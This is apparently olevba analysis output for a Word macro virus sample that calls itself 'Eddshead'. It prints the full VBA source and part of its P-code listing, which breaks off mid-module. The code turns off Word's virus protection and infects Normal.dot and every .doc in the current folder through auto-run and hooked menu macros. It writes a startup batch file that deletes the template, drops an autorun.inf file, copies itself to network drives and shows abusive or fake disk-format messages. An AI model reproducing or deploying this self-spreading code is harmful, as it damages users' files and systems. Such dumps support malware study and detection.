olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Eddshead.bas 
in file: Virus.MSWord.VMPC-based - OLE stream: 'Macros/VBA/Eddshead'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Eddshead()
    
    ' This is the first release of the eddshead MARCO virii
    ' Greetings go out to, Mr. Pink, Mr. blonde, Mr. Brown
    ' Mr. Blue and need we forget Mr. Orange (you still own me £10)
    
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "eddie.doc"
If sv = 3 Then svt$ = "orange.doc"
If sv = 2 Then svt$ = "pink.doc"
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Your Computer Has The EddsHead Marco Virii", vbSystemModal
    If rm = 10 Then MsgBox "Mr. Goodall is a cunt, watch your children!", vbSystemModal
If Month(Now()) = 11 And Day(Now()) = 4 Then MsgBox "Happy Birthday Edd", vbInformation, "Birthday Greeting!!!"
If Month(Now()) = 2 And Day(Now()) = 2 Then MsgBox "Your hard drive is being formated", vbInformation, "System notice"

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Nice Guy Eddie"
    .Subject = "Eddshead Marco Virii"
    .Comments = "Who did you get this document from ??"
    .Execute
End With
x81333293 = 0
Set cy329813311 = MacroContainer
 f1516$ = "c:\windows\startm~1\programs\startup\msfile.bat"
j3283329 = GetAttr(NormalTemplate.FullName)
If j3283329 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1516$)
If j3283329 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1516$)
If j3283329 = vbReadOnly Then GoTo orange
If j3283329 = vbReadOnly + vbArchive Then GoTo orange
If cy329813311 = NormalTemplate Then x81333293 = 1
If x81333293 = 1 Then r486813310 = NormalTemplate.FullName Else r486813310 = ActiveDocument.FullName
If x81333293 = 1 Then domeharderbaby32910 = ActiveDocument.FullName Else domeharderbaby32910 = NormalTemplate.FullName
Application.OrganizerCopy Source:=r486813310, Destination:=domeharderbaby32910, Name:="Eddshead", Object:=wdOrganizerObjectProjectItems
If x81333293 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If x81333293 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
            Call dhIconDisco("C:\autorun.inf")
orange:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Eddshead", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Eddshead
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Eddshead
End Sub
Sub FileSave()
    On Error Resume Next
    Call Eddshead
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Eddshead
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Eddshead
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call Eddshead
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Eddshead
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Eddshead
End Sub
Sub FileExit()
    On Error Resume Next
    Call Eddshead
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Eddshead
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Eddshead
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Eddshead
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Eddshead
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Eddshead
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Eddshead
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Eddshead
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Eddshead
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Eddshead
    Call p3283
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Eddshead
    Call p3283
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Eddshead
    Call p3283
End Sub
Sub p3283()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "."
            .Replacement.Text = "Eddshead"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPC-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Eddshead - 13060 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' Line #3:
' Line #4:
' 	FuncDefn (Sub Eddshead())
' Line #5:
' Line #6:
' 	QuoteRem 0x0004 0x0036 " This is the first release of the eddshead MARCO virii"
' Line #7:
' 	QuoteRem 0x0004 0x0035 " Greetings go out to, Mr. Pink, Mr. blonde, Mr. Brown"
' Line #8:
' 	QuoteRem 0x0004 0x003E " Mr. Blue and need we forget Mr. Orange (you still own me £10)"
' Line #9:
' Line #10:
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St sv 
' Line #14:
' 	Ld sv 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "eddie.doc"
' 	St svt$ 
' 	EndIf 
' Line #15:
' 	Ld sv 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "orange.doc"
' 	St svt$ 
' 	EndIf 
' Line #16:
' 	Ld sv 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "pink.doc"
' 	St svt$ 
' 	EndIf 
' Line #17:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rm 
' Line #24:
' 	Ld rm 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002A "Your Computer Has The EddsHead Marco Virii"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #25:
' 	Ld rm 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002B "Mr. Goodall is a cunt, watch your children!"
' 	Ld vbSystemModal 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Happy Birthday Edd"
' 	Ld vbInformation 
' 	LitStr 0x0014 "Birthday Greeting!!!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #27:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0021 "Your hard drive is being formated"
' 	Ld vbInformation 
' 	LitStr 0x000D "System notice"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #28:
' Line #29:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #30:
' 	LitStr 0x000E "Nice Guy Eddie"
' 	MemStWith Author 
' Line #31:
' 	LitStr 0x0014 "Eddshead Marco Virii"
' 	MemStWith Subject 
' Line #32:
' 	LitStr 0x0025 "Who did you get this document from ??"
' 	MemStWith Comments 
' Line #33:
' 	ArgsMemCallWith Execute 0x0000 
' Line #34:
' 	EndWith 
' Line #35:
' 	LitDI2 0x0000 
' 	St x81333293 
' Line #36:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set cy329813311 
' Line #37:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St f1516$ 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St j3283329 
' Line #39:
' 	Ld j3283329 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f1516$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #40:
' 	Ld j3283329 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld f1516$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #41:
' 	Ld j3283329 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo orange 
' 	EndIf 
' Line #42:
' 	Ld j3283329 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo orange 
' 	EndIf 
' Line #43:
' 	Ld cy329813311 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St x81333293 
' 	EndIf 
' Line #44:
' 	Ld x81333293 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St r486813310 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St r486813310 
' 	EndIf 
' Line #45:
' 	Ld x81333293 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St domeharderbaby32910 
' 	Else 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St domeharderbaby32910 
' 	EndIf 
' Line #46:
' 	Ld r486813310 
' 	ParamNamed Source 
' 	Ld domeharderbaby32910 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Eddshead"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld x81333293 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #48:
' 	Ld x81333293 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #52:
' 	Label orange 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub HelpAbout())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitStr 0x0008 "Eddshead"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub FileNew())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #61:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #63:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub FileSave())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #68:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub FileClose())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #73:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #74:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub ToolsOptions())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #79:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub EditFind())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #84:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileSaveAs())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #89:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub FilePrint())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub FileExit())
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #99:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #100:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #101:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #102:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #103:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #104:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #105:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #106:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #107:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #108:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #109:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #110:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #111:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Loop 
' Line #114:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #115:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #116:
' 	LitStr 0x0002 "h:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #117:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #118:
' 	LitStr 0x0002 "f:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #119:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #120:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub AutoOpen())
' Line #123:
' 	OnError (Resume Next) 
' Line #124:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub AutoExit())
' Line #127:
' 	OnError (Resume Next) 
' Line #128:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #129:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #130:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #131:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #132:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #133:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #134:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #135:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #136:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #137:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #138:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #139:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #140:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Loop 
' Line #143:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #144:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #145:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #146:
' 	LitStr 0x0002 "r:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #147:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #148:
' 	LitStr 0x0002 "s:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #149:
' 	Ld svt$ 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub AutoExec())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub AutoClose())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub ToolsMacro())
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #162:
' 	ArgsCall (Call) p3283 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub FileTemplates())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #167:
' 	ArgsCall (Call) p3283 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub ViewVBCode())
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	ArgsCall (Call) Eddshead 0x0000 
' Line #172:
' 	ArgsCall (Call) p3283 0x0000 
